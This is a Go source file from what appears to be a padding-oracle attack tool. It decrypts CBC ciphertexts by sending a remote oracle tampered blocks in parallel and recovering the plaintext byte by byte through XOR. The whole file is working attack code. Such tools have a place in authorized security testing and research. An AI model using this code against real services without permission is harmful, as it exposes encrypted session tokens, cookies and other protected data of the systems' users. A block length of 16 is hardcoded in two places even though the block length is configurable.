package main

import (
	"context"
	"fmt"
)

func decipher(cipherEncoded string) ([]byte, error) {
	// we refer to current status
	status := currentStatus
	blockLen := *config.blockLen

	/* usually we are given an initial, valid cipher, tampering on which, we discover the plaintext
	we decode it into bytes, so we can tamper it at that byte level */
	if cipherEncoded == "" {
		return nil, fmt.Errorf("empty cipher")
	}

	cipher, err := config.encoder.decode(cipherEncoded)
	if err != nil {
		return nil, err
	}

	/* we need to check that overall cipher length complies with blockLen
	as this is crucial to further logic */
	if len(cipher)%blockLen != 0 {
		return nil, fmt.Errorf("Cipher len is not compatible with block len (%d %% %d != 0)", len(cipher), blockLen)
	}
	blockCount := len(cipher)/blockLen - 1

	/* confirm padding oracle */
	err = confirmOracle(cipher)
	if err != nil {
		return nil, err
	}

	/* now, we gonna tamper at every block separately,
	thus we need to split up the whole payload into blockSize*2 sized chunks
	- first half - the bytes we gonna tamper on
	- second half - the bytes that will produce the padding error */
	cipherChunks := make([][]byte, blockCount)
	for i := 0; i < blockCount; i++ {
		cipherChunks[i] = make([]byte, blockLen*2)
		copy(cipherChunks[i], cipher[i*blockLen:(i+2)*blockLen])
	}

	// create container for a final plaintext
	plainText := make([]byte, len(cipher)-blockLen)

	// init new status bar
	status.startStatusBar(len(plainText))

	// decode every cipher chunk and fill-in the relevant plaintext positions
	// we move backwards through chunks, though it really doesn't matter
	for i := len(cipherChunks) - 1; i >= 0; i-- {
		plainChunk, err := decipherChunk(cipherChunks[i])
		if err != nil {
			return nil, err
		}
		copy(plainText[i*16:(i+1)*16], plainChunk)
	}

	// that's it!
	status.finishStatusBar()
	return plainText, nil
}

func confirmOracle(cipher []byte) error {
	status := currentStatus
	/* carry out pre-flight checks:*/
	//1. confirm that original cipher is valid (does not produce padding error)
	status.printAction("Confirming provided cipher is valid...")
	e, err := isPaddingError(cipher, nil)
	if err != nil {
		return err
	}
	if e {
		return fmt.Errorf("Initial cipher produced padding error. It is not suitable therefore")
	}

	//2. confirm that tampered cipher produces padding error
	status.printAction("Cofirming padding oracle...")
	tamperPos := len(cipher) - *config.blockLen - 1
	originalByte := cipher[tamperPos]
	defer func() { cipher[tamperPos] = originalByte }()

	/* tamper last byte  of pre-last block twice, to avoid case when we hit another valid padding
	e.g. original cipher ends with \x02\x01, if we only would use one try, we can (unlikely) hit into
	ending \x02\x02 which is also a valid padding*/
	for i := 0; i <= 3; i++ {
		// we can waste one try if hit original byte
		if byte(i) == originalByte {
			continue
		}

		cipher[tamperPos] = byte(i)
		e, err = isPaddingError(cipher, nil)
		if err != nil || e {
			break
		}
	}

	if err != nil {
		return err
	}

	if !e {
		return fmt.Errorf("padding oracle not confirmed, check the error string provided (-err option) and server response")
	}
	return nil
}

func decipherChunk(chunk []byte) ([]byte, error) {
	blockLen := *config.blockLen
	// create buffer to store the deciphered block of plaintext
	plainText := make([]byte, blockLen)

	// we start with the last byte of first block
	// and repeat the same procedure for every byte in that block, moving backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		originalByte := chunk[pos]

		// find byte which doesn't produce a padding error
		found, foundByte, err := findGoodByte(chunk, pos, originalByte)
		if err != nil {
			return nil, err
		}

		// okay, let's check
		if !found {
			// well, seems like the only valid padding is the original byte
			// that can happen if we just hit the original padding
			// so, let it be, but also check that to be sure
			chunk[pos] = originalByte
			paddingError, err := isPaddingError(chunk, nil)
			if err != nil {
				return nil, err
			}

			if paddingError {
				return nil, fmt.Errorf("failed to decrypt, not a byte got in without padding error")
			}

			foundByte = originalByte
		}

		// okay, now that we found the byte that fits, we can reveal the plaintext byte with some XOR magic
		currPaddingValue := byte(16 - pos)
		plainText[pos] = foundByte ^ originalByte ^ currPaddingValue

		// report to current status about deciphered plain byte
		if currentStatus != nil {
			currentStatus.chanPlain <- plainText[pos]
		}

		/* we need to repair the padding for the next shot
		e.g. we need to adjust the already tampered bytes block*/
		chunk[pos] = foundByte
		nextPaddingValue := currPaddingValue + 1
		adjustingValue := currPaddingValue ^ nextPaddingValue
		for i := pos; i < blockLen; i++ {
			chunk[i] ^= adjustingValue
		}
	}

	return plainText, nil
}

func findGoodByte(chunk []byte, pos int, original byte) (bool, byte, error) {
	// the common steps before we hit the parallel universe
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	chanErr := make(chan error)
	chanVal := make(chan byte)
	chanPara := make(chan byte, *config.parallel)
	chanDone := make(chan byte, *config.parallel)

	for i := 0; i <= 0xff; i++ {
		tamperedByte := byte(i)

		// we skip the original byte, to avoid false-positive when hitting original padding
		// but we can come back to it later as for the last resort
		if tamperedByte == original {
			continue
		}

		go func(value byte) {
			// report that we're done, later
			defer func() { chanDone <- 0 }()

			// parallel goroutine control channel
			chanPara <- 1
			defer func() { <-chanPara }()

			// copy chunk to make tamepering thread-safe
			chunkCopy := make([]byte, len(chunk))
			copy(chunkCopy, chunk)
			chunkCopy[pos] = value

			// test for padding oracle
			paddingError, err := isPaddingError(chunkCopy, &ctx)

			// check for errors
			if err != nil {
				// context cancel error is ignored
				if ctx.Err() != context.Canceled {
					chanErr <- err
				}
				return
			}

			// if no padding error, report the found value
			if !paddingError {
				chanVal <- value
			}
		}(tamperedByte)
	}

	// now process the results
	done := 0
	for {
		select {
		case <-chanDone:
			done++
			if done == 0xff {
				return false, 0, nil
			}
		case err := <-chanErr:
			return false, 0, err
		case val := <-chanVal:
			return true, val, nil
		}
	}
}
